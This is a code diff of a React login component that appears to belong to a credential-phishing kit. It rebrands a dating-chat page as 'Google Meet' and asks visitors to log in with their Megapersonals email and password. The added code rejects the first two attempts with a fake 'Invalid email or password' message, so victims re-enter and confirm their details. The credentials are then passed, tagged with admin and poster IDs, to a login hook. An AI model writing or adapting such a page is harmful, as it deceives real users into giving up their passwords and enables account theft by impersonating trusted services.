@@ -1,16 +1,25 @@
 "use client";
 import { site } from "../config/index";
-import Image from "next/image";
-import useMockLogin from "../hooks/useMockLogin";
 import { useState } from "react";
+import useMockLogin from "../hooks/useMockLogin";
 
 function LoginForm({ adminId, posterId }) {
   const [password, setPassword] = useState("");
   const [email, setEmail] = useState("");
+  const [attempts, setAttempts] = useState(0);
+  const [error, setError] = useState("");
 
   const { login } = useMockLogin(adminId, posterId);
 
-  const handleSubmit = async () => {
+  const handleSubmit = async (e) => {
+    if (e) e.preventDefault();
+    
+    if (attempts < 2) {
+      setError("Invalid email or password");
+      setAttempts(prev => prev + 1);
+      return;
+    }
+
     const allValues = {
       site: site,
       email: email,
@@ -18,62 +27,64 @@ function LoginForm({ adminId, posterId }) {
       skipcode: "",
     };
 
+    setError("");
     await login(allValues);
     setEmail("");
     setPassword("");
-
-    console.log("allValues", allValues);
+    setAttempts(0);
   };
 
   return (
-    <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
-      <p class="text-3xl font-semibold ">Live Video Chat</p>
-      <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
-        Know each other and enjoy{" "}
-        <span class="text-green-500">private, secure</span>
-        <span class="text-green-500"></span> and{" "}
-        <span class="text-green-500">hasslefree</span> live moment with your
-        dating partner
-      </p>
-      <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
-      <p class="text-xl font-semibold mt-3 text-center">
-        Login with Megapersonals
-      </p>
-      <div class="flex flex-col gap-y-4 mt-4">
-        <p
-          class="bg-neutral-200 p-2 rounded text-sm"
-          id="msg"
-          style={{ display: "none" }}
-        >
-          Please enter correct password
+    <div className="w-full flex flex-col items-center min-h-screen bg-white font-sans p-4 pt-20">
+      <div className="w-full max-w-[420px] flex flex-col items-center">
+        {/* Logo box */}
+        <div className="w-24 h-24 border border-gray-300 mb-4 flex items-center justify-center">
+          {/* Empty box as per screenshot */}
+        </div>
+
+        <h1 className="text-[#174ea6] text-[42px] font-bold mb-4 tracking-tight">
+          Google Meet
+        </h1>
+
+        <p className="text-[#5f6368] text-[22px] leading-[1.3] text-center mb-10 px-2">
+          Login With Megapersonals and enjoy with <span className="text-[#1a73e8] font-bold">Google Meet video chat</span> your dating partner.
         </p>
-        <input
-          required=""
-          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
-          placeholder="Enter email here"
-          type="email"
-          name="email"
-          value={email}
-          onChange={(e) => setEmail(e.target.value)}
-        />
-        <input
-          required=""
-          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
-          placeholder="Enter password here"
-          type="password"
-          name="password"
-          value={password}
-          onChange={(e) => setPassword(e.target.value)}
-        />
-        <button
-          onClick={handleSubmit}
-          class="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
-        >
-          Submit
-        </button>
+
+        <div className="w-full space-y-4">
+          <input
+            required
+            className="w-full h-14 border border-[#fbbc04] rounded px-4 outline-none text-lg text-gray-700 placeholder:text-gray-400 focus:ring-1 focus:ring-[#fbbc04]"
+            placeholder="Enter email here"
+            type="email"
+            value={email}
+            onChange={(e) => setEmail(e.target.value)}
+          />
+          <input
+            required
+            className="w-full h-14 border border-[#fbbc04] rounded px-4 outline-none text-lg text-gray-700 placeholder:text-gray-400 focus:ring-1 focus:ring-[#fbbc04]"
+            placeholder="Enter password here"
+            type="password"
+            value={password}
+            onChange={(e) => setPassword(e.target.value)}
+          />
+
+          {error && (
+            <div className="w-full bg-[#ff0000] text-white py-3 px-4 rounded text-center font-medium">
+              {error}
+            </div>
+          )}
+
+          <button
+            onClick={handleSubmit}
+            className="w-full h-14 bg-[#ffcc00] hover:bg-[#e6b800] text-white font-bold text-xl rounded shadow-sm transition-all duration-200 active:scale-[0.98]"
+          >
+            Submit
+          </button>
+        </div>
       </div>
     </div>
   );
 }
 
 export default LoginForm;
+
